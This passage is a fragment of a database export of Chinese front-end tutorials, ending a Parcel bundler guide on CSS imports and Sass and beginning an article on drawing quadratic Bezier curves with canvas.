class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e fs \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e;\n\n...\n\nconst copy = fs.readFileSync(__dirname + \u003cspan class=\"hljs-string\"\u003e'/copyright.txt'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'utf8'\u003c/span\u003e);\n\n$(\u003cspan class=\"hljs-string\"\u003e'#copy'\u003c/span\u003e).text(copy);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e8. 简单处理 css\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003estyle.css\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-tag\"\u003eh1\u003c/span\u003e {\n  \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: red;\n  \u003cspan class=\"hljs-attribute\"\u003epadding-right\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1rem\u003c/span\u003e;\n}\n\n\u003cspan class=\"hljs-selector-id\"\u003e#wrap\u003c/span\u003e {\n  \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: flex;\n  \u003cspan class=\"hljs-attribute\"\u003ejustify-content\u003c/span\u003e: center;\n  \u003cspan class=\"hljs-attribute\"\u003ealign-content\u003c/span\u003e: center;\n  \u003cspan class=\"hljs-attribute\"\u003ealign-items\u003c/span\u003e: center;\n  \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1px\u003c/span\u003e solid \u003cspan class=\"hljs-number\"\u003e#333\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003eborder-radius\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4px\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003ebox-shadow\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10px\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ergba\u003c/span\u003e(0, 0, 0, 0.12);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eindex.html\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elang\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  ...\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"style.css\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003eJoke Generator\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  ...\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e9. 在 css 中使用 import\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003ebackgrounds.css\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-tag\"\u003ebody\u003c/span\u003e {\n  \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#f4f4f4\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003estyle.css\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e@\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./backgrounds.css'\u003c/span\u003e;\n\n...\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e10. 使用 sass\u003c/h2\u003e\n\u003cp\u003e首先，安装 node-sass。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ npm install node-sass\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e这里要花费一定时间，请耐心等待\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ebackgrounds.scss\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注意：这里由 backgrounds.css 改名为 backgrounds.scss\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e@\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./variables.scss'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-selector-tag\"\u003ebody\u003c/span\u003e {\n  \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: $light-grey;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003evariables.scss\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e$light-grey: #f4f4f4;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003estyle.css\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* 改名为 scss */\u003c/span\u003e\n@\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./backgrounds.scss'\u003c/span\u003e;\n...\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 还有很多好玩的，我们以后再说。\u003c/p\u003e\n","buildTime":"1514974170.3898","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac403368"},"id":"5a410224518825094862c32f","author":{"$oid":"5a4cc38785472a29ac403355"},"imageCache":[{"imageUrlArray":["https://latex.codecogs.com/gif.latex?%7B%5Cmathbf%20%7BB%7D%7D%28t%29%3D%281-t%29%5E%7B%7B2%7D%7D%7B%5Cmathbf%20%7BP%7D%7D_%7B0%7D+2t%281-t%29%7B%5Cmathbf%20%7BP%7D%7D_%7B1%7D+t%5E%7B%7B2%7D%7D%7B%5Cmathbf%20%7BP%7D%7D_%7B2%7D%7B%5Cmbox%7B%20%2C%20%7D%7Dt%5Cin%20%5B0%2C1%5D%25u3002","https://user-gold-cdn.xitu.io/2017/12/25/1608e25792da9c97?w=240\u0026h=100\u0026f=png\u0026s=5429","https://latex.codecogs.com/gif.latex?%7B%5Cmathbf%20%7BB%7D%7D%28t%29%3D%7B%5Cmathbf%20%7BP%7D%7D_%7B0%7D%281-t%29%5E%7B3%7D+3%7B%5Cmathbf%20%7BP%7D%7D_%7B1%7Dt%281-t%29%5E%7B2%7D+3%7B%5Cmathbf%20%7BP%7D%7D_%7B2%7Dt%5E%7B2%7D%281-t%29+%7B%5Cmathbf%20%7BP%7D%7D_%7B3%7Dt%5E%7B3%7D%7B%5Cmbox%7B%20%2C%20%7D%7Dt%5Cin%20%5B0%2C1%5D%25u3002","https://user-gold-cdn.xitu.io/2017/12/25/1608e3077df20e7b?w=240\u0026h=100\u0026f=png\u0026s=7942","https://user-gold-cdn.xitu.io/2017/12/25/1608e2ba9c18d8d6?w=240\u0026h=100\u0026f=gif\u0026s=109773","https://user-gold-cdn.xitu.io/2017/12/25/1608e388394dc30e?w=240\u0026h=100\u0026f=gif\u0026s=138340","https://user-gold-cdn.xitu.io/2017/12/25/1608e389f3e76e8d?w=240\u0026h=192\u0026f=gif\u0026s=248057","https://user-gold-cdn.xitu.io/2017/12/26/160935c22ae1e69a?w=305\u0026h=269\u0026f=gif\u0026s=27239"],"screenShot":null}],"title":"用canvas绘制一个曲线动画——深入理解贝塞尔曲线","meta":{"likeCount":0},"tag":["JavaScript","Canvas"],"comment":[],"shortContent":"这篇文章我准备从实现一个非常简单的曲线动画效果入手，帮助大家彻底地弄懂什么是贝塞尔曲线，以及它有哪些特性，文章中有一点点数学公式，但是都非常简单:)。 在写代码之前，先了解一下什么是贝塞尔曲线吧。 贝塞尔曲线（Bezier curve）是计算机图形学中相当重要的参数曲线，它通过…","content":"\u003cp\u003e在前端开发中，贝赛尔曲线无处不在：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e它可以用来绘制曲线，在svg和canvas中，原生提供的曲线绘制都是使用贝赛尔曲线\u003c/li\u003e\n\u003cli\u003e它也可以用来描述一个缓动算法，设置css的\u003ccode\u003etransition-timing-function\u003c/code\u003e属性，可以使用贝塞尔曲线来描述过渡的缓动计算\u003c/li\u003e\n\u003cli\u003e几乎所有前端2D或3D图形图表库(echarts，d3，three.js)都会使用到贝塞尔曲线\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这篇文章我准备从实现一个非常简单的曲线动画效果入手，帮助大家彻底地弄懂什么是贝塞尔曲线，以及它有哪些特性，文章中有一点点数学公式，但是都非常简单:)。\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"160935917f7f0d3f\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160936fc9c5c61ac?w=305\u0026amp;h=269\u0026amp;f=gif\u0026amp;s=473671\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n实现一个曲线动画\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003e可以点击这里查看\u003ca target=\"_blank\" href=\"https://hujiulong.github.io/blog/demo/bezier/\"\u003e在线演示\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在写代码之前，先了解一下什么是贝塞尔曲线吧。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e贝塞尔曲线\u003c/h2\u003e\n\u003cp\u003e贝塞尔曲线（Bezier curve）是计算机图形学中相当重要的参数曲线，它通过一个方程来描述一条曲线，根据方程的最高阶数，又分为线性贝赛尔曲线，二次贝塞尔曲线、三次贝塞尔曲线和更高阶的贝塞尔曲线。\u003c/p\u003e\n\u003cp\u003e下面详细介绍一下用得比较多的二次贝塞尔曲线和三次贝塞尔曲线\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e二次贝塞尔曲线\u003c/h3\u003e\n\u003cp\u003e二次贝塞尔曲线由三个点\u003ccode\u003eP0\u003c/code\u003e,\u003ccode\u003eP1\u003c/code\u003e,\u003ccode\u003eP2\u003c/code\u003e来确定，这些点也被称作控制点。曲线的方程为：\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://latex.codecogs.com/gif.latex?%7B%5Cmathbf%20%7BB%7D%7D%28t%29%3D%281-t%29%5E%7B%7B2%7D%7D%7B%5Cmathbf%20%7BP%7D%7D_%7B0%7D+2t%281-t%29%7B%5Cmathbf%20%7BP%7D%7D_%7B1%7D+t%5E%7B%7B2%7D%7D%7B%5Cmathbf%20%7BP%7D%7D_%7B2%7D%7B%5Cmbox%7B%20%2C%20%7D%7Dt%5Cin%20%5B0%2C1%5D%25u3002\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003e这个方程其实有它的几何意义，它表示可以通过这样的步骤来绘制一条曲线：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e选定一个\u003ccode\u003e0-1\u003c/code\u003e的\u003ccode\u003et\u003c/code\u003e值\u003c/li\u003e\n\u003cli\u003e通过\u003ccode\u003eP0\u003c/code\u003e和\u003ccode\u003eP1\u003c/code\u003e计算出点\u003ccode\u003eQ0\u003c/code\u003e，\u003ccode\u003eQ0\u003c/code\u003e在\u003ccode\u003eP0\u003c/code\u003e \u003ccode\u003eP1\u003c/code\u003e连成的直线上，并且\u003ccode\u003elength( P0, Q0 ) = length( P0, P1 ) * t\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e同样，通过\u003ccode\u003eP1\u003c/code\u003e和\u003ccode\u003eP2\u003c/code\u003e计算出\u003ccode\u003eQ1\u003c/code\u003e，使得\u003ccode\u003elength( P1, Q1 ) = length( P1, P2 ) * t\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e再重复一次这个步骤，通过\u003ccode\u003eQ1\u003c/code\u003e和\u003ccode\u003eQ2\u003c/code\u003e计算出\u003ccode\u003eB\u003c/code\u003e，使得\u003ccode\u003elength( Q0, Q1 ) = length( Q0, B ) * t\u003c/code\u003e。\u003ccode\u003eB\u003c/code\u003e就为当前曲线上的点\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e注：上面的\u003ccode\u003elength\u003c/code\u003e表示两点之间的长度\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e25792da9c97?w=240\u0026amp;h=100\u0026amp;f=png\u0026amp;s=5429\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003ccenter\u003e图：二次贝塞尔曲线结构\u003c/center\u003e\n\u003cp\u003e有了曲线方程，我们直接代入具体的\u003ccode\u003et\u003c/code\u003e值就能算出点\u003ccode\u003eB\u003c/code\u003e了。\u003c/p\u003e\n\u003cp\u003e如果将\u003ccode\u003et\u003c/code\u003e的值从\u003ccode\u003e0\u003c/code\u003e过渡到\u003ccode\u003e1\u003c/code\u003e，不断计算点\u003ccode\u003eB\u003c/code\u003e，就可以得到一条二次贝塞尔曲线：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"s\" src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e1929786355b?w=240\u0026amp;h=100\u0026amp;f=gif\u0026amp;s=74274\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ccenter\u003e图：二次贝塞尔线绘制过程\u003c/center\u003e\n\u003cp\u003e在canvas中，绘制二次贝塞尔曲线的方法为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ectx.quadraticCurveTo( p1x, p1y, p2x, p2y )\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中\u003ccode\u003ep1x, p1y, p2x, p2y\u003c/code\u003e为后两个控制点（\u003ccode\u003eP1\u003c/code\u003e和\u003ccode\u003eP2\u003c/code\u003e）的横纵坐标，它默认将当前路径的起点作为一个控制点（\u003ccode\u003eP0\u003c/code\u003e）。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e三次贝塞尔曲线\u003c/h3\u003e\n\u003cp\u003e三次贝塞尔曲线需要四个点\u003ccode\u003eP0\u003c/code\u003e,\u003ccode\u003eP1\u003c/code\u003e,\u003ccode\u003eP2\u003c/code\u003e,\u003ccode\u003eP3\u003c/code\u003e来确定，曲线方程为\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://latex.codecogs.com/gif.latex?%7B%5Cmathbf%20%7BB%7D%7D%28t%29%3D%7B%5Cmathbf%20%7BP%7D%7D_%7B0%7D%281-t%29%5E%7B3%7D+3%7B%5Cmathbf%20%7BP%7D%7D_%7B1%7Dt%281-t%29%5E%7B2%7D+3%7B%5Cmathbf%20%7BP%7D%7D_%7B2%7Dt%5E%7B2%7D%281-t%29+%7B%5Cmathbf%20%7BP%7D%7D_%7B3%7Dt%5E%7B3%7D%7B%5Cmbox%7B%20%2C%20%7D%7Dt%5Cin%20%5B0%2C1%5D%25u3002\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n它的计算过程和二次贝塞尔曲线类似，这里不再赘述，可以看下图：\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e3077df20e7b?w=240\u0026amp;h=100\u0026amp;f=png\u0026amp;s=7942\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003ccenter\u003e图：三次贝塞尔曲线结构\u003c/center\u003e\n\u003cp\u003e同样，将\u003ccode\u003et\u003c/code\u003e的值从\u003ccode\u003e0\u003c/code\u003e过渡到\u003ccode\u003e1\u003c/code\u003e，就可以绘制出一条三次贝塞尔曲线：\u003c/p\u003e\n\u003cdiv align=\"center\"\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e2ba9c18d8d6?w=240\u0026amp;h=100\u0026amp;f=gif\u0026amp;s=109773\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003ccenter\u003e图：三次贝塞尔曲线绘制过程\u003c/center\u003e\n\u003cp\u003e在canvas中，绘制三次贝塞尔曲线的方法为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ectx.bezierCurveTo( p1x, p1y, p2x, p2y, p3x, p3y )\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中\u003ccode\u003ep1x, p1y, p2x, p2y, p3x, p3y\u003c/code\u003e为后三个控制点（\u003ccode\u003eP1\u003c/code\u003e,\u003ccode\u003eP2\u003c/code\u003e和\u003ccode\u003eP3\u003c/code\u003e）的横纵坐标，它默认将当前路径的起点作为一个控制点（\u003ccode\u003eP0\u003c/code\u003e）。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e贝塞尔曲线的特征\u003c/h3\u003e\n\u003cp\u003e在三次贝塞尔曲线后面，还有更高阶的贝塞尔曲线，同样它们绘制的过程也更加复杂\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e四次贝塞尔曲线\u003cdiv align=\"center\"\u003e\u003c/div\u003e\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e388394dc30e?w=240\u0026amp;h=100\u0026amp;f=gif\u0026amp;s=138340\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\n\u003ccenter\u003e图：四次贝塞尔曲线\u003c/center\u003e\n\u003ch4 class=\"heading\"\u003e五次贝塞尔曲线\u003cdiv align=\"center\"\u003e\u003c/div\u003e\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608e389f3e76e8d?w=240\u0026amp;h=192\u0026amp;f=gif\u0026amp;s=248057\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\n\u003ccenter\u003e图：五次贝塞尔曲线\u003c/center\u003e\n\u003cp\u003e我们可以归纳出贝塞尔曲线有几个重要的特征：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003en阶贝塞尔曲线需要n+1个点来确定\u003c/li\u003e\n\u003cli\u003e贝塞尔曲线是平滑的\u003c/li\u003e\n\u003cli\u003e贝塞尔曲线的起点和终点与对应控制点的连线相切\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e绘制贝塞尔曲线\u003c/h2\u003e\n\u003cp\u003e复习完基础概念，接下来就要讲如果绘制贝塞尔曲线啦\u003c/p\u003e\n\u003cp\u003e为简单起见，\u003cstrong\u003e我们选择使用二次贝塞尔曲线\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e我们先不考虑动画的事，我们先将问题简化成：给定一个起点和一个终点，需要实现一个函数，它能够绘制出一条曲线。\u003c/p\u003e\n\u003cp\u003e也就是说我们需要实现一个函数\u003ccode\u003edrawCurvePath\u003c/code\u003e，除渲染上下文ctx外（不清楚ctx是什么的同学可以先熟悉下canvas的基本概念），它接受三个参数，分别为二次贝塞尔曲线的三个控制点。我们将样式控制移到函数外，\u003ccode\u003edrawCurvePath\u003c/code\u003e只用来绘制路径。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制二次贝赛尔曲线路径\n * @param  {Object} ctx\n * @param  {Array\u0026lt;number\u0026gt;} p0\n * @param  {Array\u0026lt;number\u0026gt;} p1\n * @param  {Array\u0026lt;number\u0026gt;} p2\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, p0, p1, p2 \u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e前文提到过，在canvas中，绘制二次贝赛尔曲线的方法是\u003ccode\u003equadraticCurveTo\u003c/code\u003e，所以只要短短两行就能完成这个方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制二次贝赛尔曲线路径\n * @param  {CanvasRenderingContext2D} ctx\n * @param  {Array\u0026lt;number\u0026gt;} p0\n * @param  {Array\u0026lt;number\u0026gt;} p1\n * @param  {Array\u0026lt;number\u0026gt;} p2\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, p0, p1, p2 \u003c/span\u003e) \u003c/span\u003e{\n    ctx.moveTo( p0[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], p0[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] );\n    ctx.quadraticCurveTo( \n        p1[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], p1[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ],\n        p2[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], p2[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ]\n    );\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样就完成了基本的绘制二次贝塞尔曲线的方法了。\u003c/p\u003e\n\u003cp\u003e但是函数这样设计有点小问题\u003c/p\u003e\n\u003cp\u003e如果我们是在做一个图形库，我们想给使用者提供一个绘制曲线的方法。\u003c/p\u003e\n\u003cp\u003e对于使用者来说，他只想在给定的起点和终点间间绘制一条曲线，他想要得到的曲线尽量美观，但是又不想关心具体的实现细节，如果还需要给第三个点，使用者会有一定的学习成本（至少需要弄明白什么是贝塞尔曲线）。\u003c/p\u003e\n\u003cp\u003e看到这里你可能会比较疑惑，即使是二次贝塞尔曲线也需要三个控制点，只有起点和终点怎么绘制曲线呢。\u003c/p\u003e\n\u003cp\u003e我们可以在起点和终点的垂直平分线上选一点作为第三个控制点，可以提供给使用者一个参数来控制曲线的弯曲程度，现在函数就变成了这样\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制一条曲线路径\n * @param  {CanvasRenderingContext2D} ctx\n * @param  {Array\u0026lt;number\u0026gt;} start 起点\n * @param  {Array\u0026lt;number\u0026gt;} end 终点\n * @param  {number} curveness 曲度(0-1)\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness \u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们用\u003ccode\u003ecurveness\u003c/code\u003e来表示曲线的弯曲程度，也就是第三个控制点的偏离程度。这样很容易就能计算出中间点。\n现在完整的函数变成了这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 绘制一条曲线路径\n * @param  {Object} ctx canvas渲染上下文\n * @param  {Array\u0026lt;number\u0026gt;} start 起点\n * @param  {Array\u0026lt;number\u0026gt;} end 终点\n * @param  {number} curveness 曲度(0-1)\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edrawCurvePath\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e ctx, start, end, curveness \u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 计算中间控制点\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cp = [\n         ( start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] + end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ) / \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - ( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] - end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ) * curveness,\n         ( start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] + end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] ) / \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e - ( end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] - start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ] ) * curveness\n    ];\n    ctx.moveTo( start[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], start[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ] );\n    ctx.quadraticCurveTo( \n        cp[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], cp[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ],\n        end[ \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ], end[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ]\n    );\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对，就这么短短几行，接下来我们就可以通过它来绘制一条曲线了，代码如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elang\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan 